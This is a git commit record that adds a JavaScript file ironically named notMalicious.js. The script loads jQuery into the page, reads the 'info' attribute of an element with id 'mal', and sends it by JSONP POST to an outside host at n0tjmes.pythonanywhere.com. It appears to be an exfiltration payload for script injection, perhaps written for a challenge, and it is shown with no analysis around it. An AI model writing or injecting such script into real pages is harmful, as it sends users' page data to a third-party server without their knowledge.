9b77c105e19bebfa997f26e0b5b44fd79e9ba1b5
notJmes <87146892+notJmes@users.noreply.github.com>
2021-08-17 11:37:11 +0800

    Create notMalicious.js

---
+++ notMalicious.js
@@ -0,0 +1,29 @@
+(function() {
+    var script = document.createElement("SCRIPT");
+    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js';
+    script.type = 'text/javascript';
+    document.getElementsByTagName("head")[0].appendChild(script);
+    var checkReady = function(callback) {
+        if (window.jQuery) {
+            callback(jQuery);
+        }
+        else {
+            window.setTimeout(function() { checkReady(callback); }, 20);
+        }
+    };
+
+    // Start polling...
+    checkReady(function($) {
+      $.ajax({
+        url: "http://n0tjmes.pythonanywhere.com",
+        type: "POST",
+        dataType: "jsonp",
+        data: {
+          'info': document.getElementById('mal').getAttribute('info')
+        },
+        success: function(x) {
+          console.log(x)
+        }
+      });
+    });
+})();
